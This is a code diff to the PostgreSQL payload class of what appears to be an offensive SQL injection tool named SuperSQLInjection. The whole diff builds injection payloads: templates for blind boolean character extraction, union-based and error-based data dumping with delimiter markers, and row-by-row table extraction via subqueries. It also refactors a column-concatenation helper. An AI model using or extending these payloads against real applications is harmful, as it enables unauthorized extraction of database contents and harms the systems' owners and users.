@@ -30,13 +30,14 @@ namespace SuperSQLInjection.payload
 
 
         public static String bool_length = "char_length(cast({data} as text))";
-        
 
         public static String bool_value = "ascii(substring(cast({data} as text),{index},1))";
 
         public static String bool_data = " {data}>{len}";
 
         public static String substr_one_value = "(substring(cast({data} as text),{index},1))";
+
+        public static String substr_nocast = "(substring({data},{index},1))";
 
         //获取数据库数量bool方式
         public static String bool_db_count = " " + dbs_count + ">{len}";
@@ -56,6 +57,7 @@ namespace SuperSQLInjection.payload
 
         //bool方式获取值
         public static String ver_value = " "+ bool_value + ">{len}";
+       
 
         //bool方式获取值
         public static String char_length_val = " " + char_length + ">{len}";
@@ -66,8 +68,8 @@ namespace SuperSQLInjection.payload
         //获取行数据bool
         public static String data_value = "(select {columns} from {dbname}.{table} offset {index} limit 1)";
     
-        //获取数据bool,加入orderby解决获取数据时，获取到的数据每一行可能不对称的可能
-        public static String data_value_orderBy = "(select {columns} from {dbname}.{table} order by {orderby} offset {index} limit 1)";
+        //获取数据bool,利用子查询，防止数据每一行可能存在不对称的可能
+        public static String data_value_order = "(select {column} from (select {columns} from {dbname}.{table} offset {index} limit 1)tmp)";
 
         //union获取数据条数
         public static String data_count = "(select count(*) from {dbname}.{table})";
@@ -128,9 +130,21 @@ namespace SuperSQLInjection.payload
         /// <param name="index">第几行数据，1开始</param>
         public static String getErrorDataValue(String dbname, String table, int index, List<String> columns)
         {
-            String data = data_value.Replace("{columns}", Comm.unionColumns(columns, "||chr(36)||chr(36)||chr(36)||"));
+            String data = data_value.Replace("{columns}", unionColumns(columns, "||chr(36)||chr(36)||chr(36)||"));
             String d = data.Replace("{dbname}", dbname).Replace("{table}", table).Replace("{index}", index.ToString());
             return error_value.Replace("{data}", d);
+        }
+
+        public static String unionColumns(List<String> columns, String unionStr)
+        {
+            StringBuilder sb = new StringBuilder();
+            foreach (String column in columns)
+            {
+
+                sb.Append("coalesce(cast(" + column + " as text),chr(32))" + unionStr);
+            }
+            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
+            return sb.ToString();
         }
 
         public static String getReadFilePayload(String path)
@@ -169,7 +183,7 @@ namespace SuperSQLInjection.payload
         public static String getUnionDataValue(int columnsLen, int showIndex, List<String> columns, String dbname, String table, String index)
         {
             StringBuilder sb = new StringBuilder();
-            String data = "chr(94)||chr(94)||chr(33)||" + Comm.unionColumns(columns, "||chr(36)||chr(36)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
+            String data = "chr(94)||chr(94)||chr(33)||" + unionColumns(columns, "||chr(36)||chr(36)||chr(36)||") + "||chr(33)||chr(94)||chr(94)";
             for (int i = 1; i <= columnsLen; i++)
             {
                 if (i == showIndex)
@@ -201,9 +215,9 @@ namespace SuperSQLInjection.payload
 
         }
 
-        public static String getBoolDataPayLoad(String column, String orderBy, String dbName, String table, int index)
+        public static String getBoolDataPayLoad(String column, List<String> columns, String dbName, String table, int index)
         {
-            String data = data_value_orderBy.Replace("{columns}", column).Replace("{orderby}", orderBy).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index + "");
+            String data = data_value_order.Replace("{column}", column).Replace("{columns}", String.Join(",", columns)).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index + "");
             return data;
         }
 
